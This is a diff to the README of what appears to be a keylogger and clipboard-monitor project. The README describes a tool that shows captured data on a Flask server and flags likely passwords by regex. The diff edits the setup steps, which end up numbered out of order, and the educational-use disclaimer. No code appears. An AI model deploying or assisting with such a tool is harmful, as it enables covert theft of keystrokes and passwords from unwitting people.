@@ -13,12 +13,12 @@ Provides a real-time display of received data using a Flask web server.
 Identifies potential passwords based on regex patterns.
 Instructions:
 
-Clone the repository.
-Install the required dependencies using pip install -r requirements.txt.
-Run the main script main.py to start the keylogger and clipboard monitor.
-Access the real-time data display through the Flask web server.
+1)Clone the repository.
+2)Install the required dependencies using pip install -r requirements.txt.
+4)Use flask run --host 0.0.0.0 to power on your server.
+3)Run the main script keylogger.py to start the keylogger and clipboard monitor.
 Usage Warning:
-This project is intended for educational and informational purposes only. The use of keyloggers and clipboard monitors for malicious activities is illegal and unethical. Use this code responsibly and in compliance with applicable laws and regulations.
+This project is intended for educational and informational purposes only. The use of keyloggers and clipboard monitors for malicious activities is illegal and unethical. Use this code responsibly in a test environment and in compliance with applicable laws and regulations.
 
 License:
 This project is licensed under the MIT License.
